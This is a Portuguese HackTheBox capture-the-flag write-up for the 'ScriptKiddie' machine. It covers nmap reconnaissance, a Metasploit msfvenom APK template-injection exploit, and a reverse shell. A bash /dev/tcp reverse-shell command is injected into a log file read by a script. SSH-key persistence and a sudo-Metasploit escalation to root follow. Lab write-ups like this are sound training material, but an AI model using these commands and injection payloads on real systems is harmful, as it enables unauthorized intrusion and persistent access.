<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ScriptKiddie - HackTheBox - WriteUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/dsiv3vG.png)

**Tools** utilizadas:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap
metasploit
python
ssh-keygen
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: OPTIONS POST GET HEAD
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/7%OT=22%CT=1%CU=37548%PV=Y%DS=2%DC=T%G=Y%TM=60200274
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 22.669 days (since Fri Jan 15 18:05:57 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Acessando o serviço http da porta 5000, nos deparamos com um site de 'tools' hackers... ao testar alguns desses campos, o campo de upload chamou atenção, por ser um campo do [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) e existir uma falha conhecida sobre Template Injection via APK.

![Image](https://i.imgur.com/aiQqHGN.png)

Então vamos buscar por essa falha no metasploit:

![Image](https://i.imgur.com/Ur9uW3n.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfconsole
search msfvenom
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Olhamos os campos obrigatórios do exploit:

![Image](https://i.imgur.com/WOxQaQs.png)

Setamos com nosso IP e porta desejada. Após executar o exploit ele criará um arquivo APK com nosso payload.

![Image](https://i.imgur.com/VoktRsV.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
set LHOST
set LPORT
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Voltamos ao site da porta 5000 e setamos os campos como: 'Android' , '10.10.14.219' e selecionamos nosso arquivo

![Image](https://i.imgur.com/Q5tmarS.png)

Após clicar em generate, a conexão chega em nosso netcat:

![Image](https://i.imgur.com/re79P0M.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -vvnlp 4444
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Usamos o python3 para melhorar nossa shell:

![Image](https://i.imgur.com/rSII9HK.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 -c 'import pty;pty.spawn("/bin/bash")'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Geramos uma chave em nossa máquina:

![Image](https://i.imgur.com/eeXxCBN.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh-keygen
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Escrevemos a chave RSA dentro do arquivo authorized_keys para conseguirmos uma conexão SSH.

![Image](https://i.imgur.com/sCZrZML.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd ~
cd .ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCneP1h2E/pSKsdUVMxMJjfdUGZyjTNQhnisB/yG5jVt5uMNZEmKDee60lHtYqNoxgmPLQ/m4RQ4Y7A1nzh4mLz7Qut2h/yxSNNh+6HdChsXwoIunQfRaBM491FpwGa7/6/wp+GeIkGEduw/pDEFG9holYghJUtX/epWjEJT4z7HNufRhAWHAT4DwJThSCStzvmySyyzoRtJXiImY5cSDmwO7Al4mjWRX8IZyjqN+VyuZD1CMTlf52UCqQv9Zxzg4486+I+MCGa6Va9lEQWT6fL780t1rIi+PpsToF8MDpCRWUCGRltNzDbgKVVTyi3uITWrUxDXUlmv9+ykvkf1ENUUQEHazf6eRc35Ghvadikh27pbpzn2AH3DAHln9A0gDHtLATzURVGNiPplW7azhS+ukeoJw7AAb9UP3NX6elacnjaW3fhVu+oV+H2CJ0yxC5pFfea7lq4EkpScYq6lP29+niIiCq5MUPh4ijGkGEZCRL8G+HNRvOXmSRuqmNs6L8= root@antisec" >> authorized_keys
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Depois de escreve-la, fazemos a conexão via SSH.

![Image](https://i.imgur.com/pqg9EbZ.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh kid@scriptkiddie.htb -i kid
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Listando as pastas da raiz do usuário kid, temos uma pasta chamada logs

![Image](https://i.imgur.com/UbfufK8.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ls -la
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Dentro dessa pasta chamada logs, existe um arquivo chamado hackers que faz parte do grupo 'pwn'

![Image](https://i.imgur.com/W5ty0Le.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ls -la
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Na pasta do usuário pwn (/home/pwn) temos um bash script chamado scanlosers.sh que interage com o arquivo hackers, o qual temos permissão de escrita.

![Image](https://i.imgur.com/ktXrPA3.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd /home/pwn
cat scanlosers.sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Portanto, usamos o echo para inserir um comando e quebrar a syntax do código scanlosers.sh e executar um comando nosso.
O script usa o 'cut -d ' ' -f3-' então vamos passar 3 espaçõs iniciais e rodar um comando em seguida.

![Image](https://i.imgur.com/W8fDCUs.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd /home/kid/logs
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.219/1337 0>&1' #" >> hackers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao fazer isso, recebemos a conexão já como usuário pwn :)

![Image](https://i.imgur.com/2t9MkbF.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -vvnlp 1337
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Listamos se temos permissão pra user algum programa com permissão de root, e temos o metasploit (lol)

![Image](https://i.imgur.com/a4gOhX0.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo -l
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


O Metasploit permite executar comando shell mesmo dentro do framework :)
Geramos a chave em nossa máquina:

![Image](https://i.imgur.com/JLVx2yJ.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh-keygen
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

E então, vamos escrever uma chave RSA no arquivo /root/.ssh/authorized_keys

![Image](https://i.imgur.com/Rw4kvD9.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDahIdVfE+PSXj1pXUKgyl1srULxOZ8tczHrsxKW5OjWV8MtKTHLW0sGoYxT+d/vxS0/KaCVdLPYjbDXJ7+758TIHWi+km7Tx1UOnj+F0fuQhc3Kw51n+dc7CSMMGOWGS16cJj9VWjFklj8T0cLoOUzbT7If7Xn4Cwz0OzLth+heqqCFBQQjHrQj+5jFlGIQycu5BmbCuuu3Eh5rBArgrF2XMDXUkAZjARczjhIPzTM1MW7wKCAok+gS3u0Epry8ULEwJjhiXAXbCLGivInit7GU8Smk/JnmGkY4ZerJqNL4FsGlhjLgi9Bu9QnFF0ZPXLFQsL9M5oH7vN75ZS6KIno8D8naZT2eoK97zq4DE8q9FqOEWV/b2FNxTZgn3Mf/M8xbq0r/WQ/p4+66Ch7ypbyKKXOVSGgwh9wedZyzTwn/waU6lex0DD96RTwmxm7t2mVGTasMhdVVK+v9H7XhfiyEG6lKZIK2c6CNsbJ2Mzo43YaBylKyG0YRpwCNSxdgB0= root@antisec" >> /root/.ssh/authorized_keys
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Agora usamos a chave e we are r00t :~

![Image](https://i.imgur.com/Rw1wh5f.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh root@scriptkiddie.htb -i r00t
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


if i helped you, add + respect at my profile :D
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>
 
my references
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
